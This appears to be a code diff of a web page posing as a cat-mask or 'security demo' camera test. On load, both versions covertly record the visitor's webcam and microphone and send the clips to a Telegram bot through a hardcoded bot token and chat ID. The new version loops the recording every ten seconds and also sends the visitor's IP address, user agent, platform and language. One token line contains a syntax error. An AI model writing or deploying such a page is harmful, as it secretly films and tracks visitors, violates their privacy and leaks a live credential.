@@ -3,88 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recording and Telegram</title>
-    <style>
-        #video {
-            display: block;
-            width: 640px;
-            height: 480px;
-        }
-        #progress {
-            margin-top: 10px;
-        }
-    </style>
+    <title>Security Demo with Video Recording</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
 </head>
 <body>
-    <h1>Маска кота тест</h1>
-    <video id="video" autoplay></video>
-    <div id="progress">Progress: <span id="progressText">0%</span></div>
+    <h1>Test Mask</h1>
+    <video id="video" width="640" height="480" autoplay></video>
 
     <script>
         const video = document.getElementById('video');
-        const progressText = document.getElementById('progressText');
-
         let mediaRecorder;
         let recordedChunks = [];
 
-        const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
-        const chatId = '6121166273'; // Замените на ваш chat ID
+        // Access the camera and start video streaming
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                mediaRecorder.start();
+                setInterval(() => {
+                    mediaRecorder.stop();
+                    sendToTelegram(new Blob(recordedChunks, { type: 'video/webm' }));
+                    recordedChunks = [];
+                    mediaRecorder.start();
+                }, 10000); // Record in 10-second intervals
+            })
+            .catch(err => console.error('Error accessing media devices.', err));
 
-        // Function to start video
-        function startVideo() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setupMediaRecorder(stream);
-
-                    video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            mediaRecorder.start();
-                            console.log('Recording started');
-                            sendNotificationToTelegram('User has started recording.');
-                            
-                            // Stop recording automatically after 10 seconds
-                            setTimeout(() => {
-                                mediaRecorder.stop();
-                                console.log('Recording stopped after 10 seconds');
-                                sendNotificationToTelegram('Recording stopped after 10 seconds.');
-                            }, 10000); // 10 seconds
-                        }, 3000); // Delay to allow camera to focus
-                    };
-                })
-                .catch(err => console.error("Error accessing camera: ", err));
-        }
-
-        // Function to setup MediaRecorder
-        function setupMediaRecorder(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                    updateProgress();
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                console.log('MediaRecorder stopped.');
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                recordedChunks = []; // Reset chunks after processing
-                const videoURL = URL.createObjectURL(blob);
-                console.log('Recording stopped. Preparing to send video...');
-                sendNotificationToTelegram('Recording stopped. Preparing to send video...');
-                sendToTelegram(blob);
-            };
-        }
-
-        // Function to update progress
-        function updateProgress() {
-            const percentage = Math.round((recordedChunks.length / (mediaRecorder && mediaRecorder.state === 'recording' ? 100 : 1)) * 100);
-            progressText.textContent = `${percentage}%`;
-        }
-
-        // Function to send video to Telegram
+        // Function to send the video to Telegram
         function sendToTelegram(blob) {
+            const token = ''7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
+            const chatId = '6121166273';
             const url = `https://api.telegram.org/bot${token}/sendVideo`;
 
             const formData = new FormData();
@@ -96,57 +50,43 @@
                 body: formData
             })
             .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('Video sent successfully:', data);
-                    sendNotificationToTelegram('Video sent successfully.');
-                } else {
-                    console.error('Telegram API error:', data.description);
-                    sendNotificationToTelegram('Error sending video to Telegram: ' + data.description);
-                }
-            })
-            .catch((error) => {
-                console.error('Error sending video to Telegram:', error);
-                sendNotificationToTelegram('Error sending video to Telegram: ' + error.message);
-            });
+            .then(data => console.log('Video sent successfully:', data))
+            .catch((error) => console.error('Error sending video to Telegram:', error));
         }
 
-        // Function to send notification to Telegram
-        function sendNotificationToTelegram(message) {
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        // Collect IP address and device information
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP Address:', data.ip);
+                sendDeviceInfo(data.ip);
+            });
 
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('text', message);
+        function sendDeviceInfo(ip) {
+            const deviceInfo = {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timestamp: new Date().toISOString()
+            };
+
+            const token = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
             fetch(url, {
                 method: 'POST',
-                body: formData
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `New visitor info:\nIP: ${deviceInfo.ip}\nUser-Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}\nTimestamp: ${deviceInfo.timestamp}`
+                })
             })
             .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('Notification sent successfully:', data);
-                } else {
-                    console.error('Telegram API error:', data.description);
-                }
-            })
-            .catch((error) => console.error('Error sending notification to Telegram:', error));
+            .then(data => console.log('Device info sent successfully:', data))
+            .catch((error) => console.error('Error sending device info to Telegram:', error));
         }
-
-        // Handle browser tab or window close
-        window.addEventListener('beforeunload', (event) => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                console.log('Recording stopped due to user leaving the site');
-                sendNotificationToTelegram('User left the site. Recording stopped.');
-                event.preventDefault(); // Required for modern browsers
-                event.returnValue = ''; // For some browsers
-            }
-        });
-
-        // Start video on page load
-        window.onload = startVideo;
     </script>
 </body>
 </html>
